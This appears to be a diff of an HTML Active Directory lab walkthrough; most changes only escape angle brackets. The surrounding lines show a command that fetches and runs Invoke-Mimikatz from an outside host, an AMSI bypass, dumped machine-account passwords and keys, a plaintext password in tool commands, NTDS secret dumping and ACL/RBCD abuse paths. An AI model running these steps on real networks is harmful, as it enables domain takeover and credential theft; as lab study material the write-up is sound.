-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ADMINSDHOLDER@ACADEMY.NINJA.LAN
-[+] ACL : FRANK@ACADEMY.NINJA.LAN--> AllowedToDelegate --> SHARE.ACADEMY.NINJA.LAN
-[+] ACL : GMSANFS$@ACADEMY.NINJA.LAN--> ForceChangePassword --> BACKUP@ACADEMY.NINJA.LAN</code></pre>
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; UMA@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; KATHERINE@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; YARA@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; DAVID@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ALICE@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; VAGRANT@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; KRBTGT@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ADMINISTRATOR@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ADMINISTRATORS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; DOMAIN ADMINS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ENTERPRISE ADMINS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ACCOUNT OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; KEY ADMINS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; SENSEI@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; SERVER OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; SCHEMA ADMINS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; REPLICATOR@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; PRINT OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; BACKUP OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
+[+] ACL : BACKUP@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; ADMINSDHOLDER@ACADEMY.NINJA.LAN
+[+] ACL : FRANK@ACADEMY.NINJA.LAN--&gt; AllowedToDelegate --&gt; SHARE.ACADEMY.NINJA.LAN
+[+] ACL : GMSANFS$@ACADEMY.NINJA.LAN--&gt; ForceChangePassword --&gt; BACKUP@ACADEMY.NINJA.LAN</code></pre>
 
 <h4>Summary of Attack Path:</h4>
 
@@ -1619,9 +1619,9 @@ IEX(IWR http://192.168.58.1:8080/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-M
 <pre><code>  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz(powershell) # sekurlsa::ekeys
 
@@ -1673,7 +1673,7 @@ SID               : S-1-5-90-0-1
 
 	* Username : WEB$
 	* Domain   : academy.ninja.lan
-	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?>6DLP=uurY&xF!2LJgZNHIkS"?*bl=3<7zzDH;r1hF89>].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072>BzRY
+	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?&gt;6DLP=uurY&xF!2LJgZNHIkS"?*bl=3&lt;7zzDH;r1hF89&gt;].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072&gt;BzRY
 	* Key List :
 	  aes256_hmac       0d6f7e35e4ab5c8618a49683a18d488d77eed47895253953431ac5d0eeba2665
 	  aes128_hmac       2d804325c40cf59f96e743ec0809fb19
@@ -1693,7 +1693,7 @@ SID               : S-1-5-90-0-1
 
 	* Username : WEB$
 	* Domain   : academy.ninja.lan
-	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?>6DLP=uurY&xF!2LJgZNHIkS"?*bl=3<7zzDH;r1hF89>].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072>BzRY
+	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?&gt;6DLP=uurY&xF!2LJgZNHIkS"?*bl=3&lt;7zzDH;r1hF89&gt;].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072&gt;BzRY
 	* Key List :
 	  aes256_hmac       0d6f7e35e4ab5c8618a49683a18d488d77eed47895253953431ac5d0eeba2665
 	  aes128_hmac       2d804325c40cf59f96e743ec0809fb19
@@ -1732,7 +1732,7 @@ SID               : S-1-5-96-0-0
 
 	* Username : WEB$
 	* Domain   : academy.ninja.lan
-	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?>6DLP=uurY&xF!2LJgZNHIkS"?*bl=3<7zzDH;r1hF89>].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072>BzRY
+	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?&gt;6DLP=uurY&xF!2LJgZNHIkS"?*bl=3&lt;7zzDH;r1hF89&gt;].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072&gt;BzRY
 	* Key List :
 	  aes256_hmac       0d6f7e35e4ab5c8618a49683a18d488d77eed47895253953431ac5d0eeba2665
 	  aes128_hmac       2d804325c40cf59f96e743ec0809fb19
@@ -1771,7 +1771,7 @@ SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-400469641
 
 	* Username : WEB$
 	* Domain   : academy.ninja.lan
-	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?>6DLP=uurY&xF!2LJgZNHIkS"?*bl=3<7zzDH;r1hF89>].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072>BzRY
+	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?&gt;6DLP=uurY&xF!2LJgZNHIkS"?*bl=3&lt;7zzDH;r1hF89&gt;].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072&gt;BzRY
 	* Key List :
 	  aes256_hmac       0d6f7e35e4ab5c8618a49683a18d488d77eed47895253953431ac5d0eeba2665
 	  aes128_hmac       2d804325c40cf59f96e743ec0809fb19
@@ -1810,7 +1810,7 @@ SID               : S-1-5-96-0-1
 
 	* Username : WEB$
 	* Domain   : academy.ninja.lan
-	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?>6DLP=uurY&xF!2LJgZNHIkS"?*bl=3<7zzDH;r1hF89>].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072>BzRY
+	* Password : i5E#bmzN8NUM_JMo=3a9)/WCne?&gt;6DLP=uurY&xF!2LJgZNHIkS"?*bl=3&lt;7zzDH;r1hF89&gt;].mN3!xdD&i$cehbM#4UUjL#[7P`(z-F_ULhFF%y072&gt;BzRY
 	* Key List :
 	  aes256_hmac       0d6f7e35e4ab5c8618a49683a18d488d77eed47895253953431ac5d0eeba2665
 	  aes128_hmac       2d804325c40cf59f96e743ec0809fb19
@@ -1948,9 +1948,9 @@ We have to bypass AMSI first, then I executed Invoke-Mimikatz.</p>
 <pre><code>  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz(powershell) # sekurlsa::ekeys
 
@@ -1983,7 +1983,7 @@ SID               : S-1-5-90-0-1
 
 	* Username : SHARE$
 	* Domain   : academy.ninja.lan
-	* Password :  ?Y:F.qPrerAC?b.u<O'$*vU3u%0Zzg>m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx>u:*l_e
+	* Password :  ?Y:F.qPrerAC?b.u&lt;O'$*vU3u%0Zzg&gt;m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx&gt;u:*l_e
 	* Key List :
 	  aes256_hmac       aed5df4e9a6311997bc5996bcca41851ff056d0735236f174f46051e218f0364
 	  aes128_hmac       399d883249f0a4ca211dd56494780044
@@ -2003,7 +2003,7 @@ SID               : S-1-5-90-0-1
 
 	* Username : SHARE$
 	* Domain   : academy.ninja.lan
-	* Password :  ?Y:F.qPrerAC?b.u<O'$*vU3u%0Zzg>m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx>u:*l_e
+	* Password :  ?Y:F.qPrerAC?b.u&lt;O'$*vU3u%0Zzg&gt;m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx&gt;u:*l_e
 	* Key List :
 	  aes256_hmac       aed5df4e9a6311997bc5996bcca41851ff056d0735236f174f46051e218f0364
 	  aes128_hmac       399d883249f0a4ca211dd56494780044
@@ -2023,7 +2023,7 @@ SID               : S-1-5-96-0-1
 
 	* Username : SHARE$
 	* Domain   : academy.ninja.lan
-	* Password :  ?Y:F.qPrerAC?b.u<O'$*vU3u%0Zzg>m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx>u:*l_e
+	* Password :  ?Y:F.qPrerAC?b.u&lt;O'$*vU3u%0Zzg&gt;m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx&gt;u:*l_e
 	* Key List :
 	  aes256_hmac       aed5df4e9a6311997bc5996bcca41851ff056d0735236f174f46051e218f0364
 	  aes128_hmac       399d883249f0a4ca211dd56494780044
@@ -2043,7 +2043,7 @@ SID               : S-1-5-96-0-0
 
 	* Username : SHARE$
 	* Domain   : academy.ninja.lan
-	* Password :  ?Y:F.qPrerAC?b.u<O'$*vU3u%0Zzg>m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx>u:*l_e
+	* Password :  ?Y:F.qPrerAC?b.u&lt;O'$*vU3u%0Zzg&gt;m)r$;jE.T#cZ!Y;D2/446Mt=2j^i7K(]7vn0F"!M9+X=tXeL^_e06[gSorJ9**RZxG^1,PcNaE=6&"9qx&gt;u:*l_e
 	* Key List :
 	  aes256_hmac       aed5df4e9a6311997bc5996bcca41851ff056d0735236f174f46051e218f0364
 	  aes128_hmac       399d883249f0a4ca211dd56494780044
@@ -2153,29 +2153,29 @@ netexec smb dc-ac.academy.ninja.lan -u 'backup' -p 'Stark123!Backup' -d 'academy
 
 <img src="./images/screenshot_61.png" alt="">
 
-<pre><code>[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ACCOUNT OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINISTRATOR@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINISTRATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINSDHOLDER@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ALICE@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> BACKUP OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DAVID@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DOMAIN ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ENTERPRISE ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KATHERINE@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KEY ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KRBTGT@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> PRINT OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> REPLICATOR@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SCHEMA ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SENSEI@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SERVER OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> UMA@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> VAGRANT@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> YARA@ACADEMY.NINJA.LAN</code></pre>
+<pre><code>[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ACCOUNT OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINISTRATOR@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINISTRATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINSDHOLDER@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ALICE@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; BACKUP OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DAVID@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DOMAIN ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ENTERPRISE ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KATHERINE@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KEY ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KRBTGT@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; PRINT OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; REPLICATOR@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SCHEMA ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SENSEI@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SERVER OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; UMA@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; VAGRANT@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; YARA@ACADEMY.NINJA.LAN</code></pre>
 
 <p>We will use owneredit.py to enumerate Domain Admins group owner and also to change overpass ownership
 owneredit.py -action 'read' -target 'Domain Admins' 'academy.ninja.lan/backup:Stark123!Backup'</p>
@@ -2254,7 +2254,7 @@ dpapi_userkey:0x93ff7e7fc200e3b142753ad360cabfd33ba5570b
  0000   64 08 D7 D8 E2 AF EA 8D  0F 5E 5B 10 1F 23 11 78   d........^[..#.x
  0010   ED CE AE 62 D3 21 B9 40  A8 90 6C 04 48 D8 43 40   ...b.!.@..l.H.C@
  0020   0B C9 38 BA 1C CA CF F0  B5 11 7C 8C E6 5D 2C 99   ..8.......|..],.
- 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........>...`.
+ 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........&gt;...`.
 NL$KM:6408d7d8e2afea8d0f5e5b101f231178edceae62d321b940a8906c0448d843400bc938ba1ccacff0b5117c8ce65d2c99460e1b18b3e1dff7831c3ececd1e609b
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -2452,9 +2452,9 @@ bloodhound-python -c all  -d 'ninja.hack' -u 'olivia.davis' --hashes ':91d85135b
 [+] Domain admins (group) 	: DOMAIN ADMINS@NINJA.HACK
 [+] Domain admins (group) 	: ENTERPRISE ADMINS@NINJA.HACK
 [+] Domain admins (group) 	: HOKAGE@NINJA.HACK
-[+] Domain admins (enabled) 	: ADMINISTRATOR@NINJA.HACK [LASTLOG: < 1 year]
+[+] Domain admins (enabled) 	: ADMINISTRATOR@NINJA.HACK [LASTLOG: &lt; 1 year]
 [+] Domain admins (enabled) 	: ALICE.JOHNSON@NINJA.HACK [LASTLOG:  NEVER]
-[+] Domain admins (enabled) 	: VAGRANT@NINJA.HACK [LASTLOG: < 1 year]
+[+] Domain admins (enabled) 	: VAGRANT@NINJA.HACK [LASTLOG: &lt; 1 year]
 
 ###########################################################
 [*] Enumerating all SPN
@@ -2469,40 +2469,40 @@ bloodhound-python -c all  -d 'ninja.hack' -u 'olivia.davis' --hashes ':91d85135b
 ###########################################################
 [*] Can configure Resource-Based Constrained Delegation
 ###########################################################
-[+] RBCD : configure from OLIVIA.DAVIS@NINJA.HACK --> WriteDacl --> RACHEL.PHILIPS@NINJA.HACK
-[+] RBCD : configure from SANIN@NINJA.HACK --> GenericAll --> JONIN@NINJA.HACK
+[+] RBCD : configure from OLIVIA.DAVIS@NINJA.HACK --&gt; WriteDacl --&gt; RACHEL.PHILIPS@NINJA.HACK
+[+] RBCD : configure from SANIN@NINJA.HACK --&gt; GenericAll --&gt; JONIN@NINJA.HACK
 
 ###########################################################
 [*] relationships - testing which group can do what to others (all)
 ###########################################################
-[+] ACL : HOKAGE@NINJA.HACK--> AdminTo --> DC-VIL.NINJA.HACK
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> DOMAIN ADMINS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ENTERPRISE ADMINS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> KEY ADMINS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ENTERPRISE KEY ADMINS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ADMINISTRATORS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> DOMAIN CONTROLLERS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ADMINISTRATOR@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> VAGRANT@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ADMINSDHOLDER@NINJA.HACK
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> KRBTGT@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ALICE.JOHNSON@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> SCHEMA ADMINS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> READ-ONLY DOMAIN CONTROLLERS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> DCSync --> NINJA.HACK
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> ACCOUNT OPERATORS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> SERVER OPERATORS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> REPLICATOR@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> BACKUP OPERATORS@NINJA.HACK [AdminCount]
-[+] ACL : HOKAGE@NINJA.HACK--> GenericAll --> PRINT OPERATORS@NINJA.HACK [AdminCount]
-[+] ACL : RAS AND IAS SERVERS@NINJA.HACK--> WriteDacl --> RAS AND IAS SERVERS ACCESS CHECK@NINJA.HACK
-[+] ACL : RAS AND IAS SERVERS@NINJA.HACK--> WriteOwner --> RAS AND IAS SERVERS ACCESS CHECK@NINJA.HACK
-[+] ACL : SANIN@NINJA.HACK--> GenericAll --> JONIN@NINJA.HACK
+[+] ACL : HOKAGE@NINJA.HACK--&gt; AdminTo --&gt; DC-VIL.NINJA.HACK
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; DOMAIN ADMINS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ENTERPRISE ADMINS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; KEY ADMINS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ENTERPRISE KEY ADMINS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ADMINISTRATORS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; DOMAIN CONTROLLERS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ADMINISTRATOR@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; VAGRANT@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ADMINSDHOLDER@NINJA.HACK
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; KRBTGT@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ALICE.JOHNSON@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; SCHEMA ADMINS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; READ-ONLY DOMAIN CONTROLLERS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; DCSync --&gt; NINJA.HACK
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; ACCOUNT OPERATORS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; SERVER OPERATORS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; REPLICATOR@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; BACKUP OPERATORS@NINJA.HACK [AdminCount]
+[+] ACL : HOKAGE@NINJA.HACK--&gt; GenericAll --&gt; PRINT OPERATORS@NINJA.HACK [AdminCount]
+[+] ACL : RAS AND IAS SERVERS@NINJA.HACK--&gt; WriteDacl --&gt; RAS AND IAS SERVERS ACCESS CHECK@NINJA.HACK
+[+] ACL : RAS AND IAS SERVERS@NINJA.HACK--&gt; WriteOwner --&gt; RAS AND IAS SERVERS ACCESS CHECK@NINJA.HACK
+[+] ACL : SANIN@NINJA.HACK--&gt; GenericAll --&gt; JONIN@NINJA.HACK
 
 ###########################################################
 [*] relationships - testing which (non admins) users can do what to others (all)
 ###########################################################
-[+] ACL : OLIVIA.DAVIS@NINJA.HACK--> WriteDacl --> RACHEL.PHILIPS@NINJA.HACK</code></pre>
+[+] ACL : OLIVIA.DAVIS@NINJA.HACK--&gt; WriteDacl --&gt; RACHEL.PHILIPS@NINJA.HACK</code></pre>
 
 <img src="./images/screenshot_73.png" alt="">
 
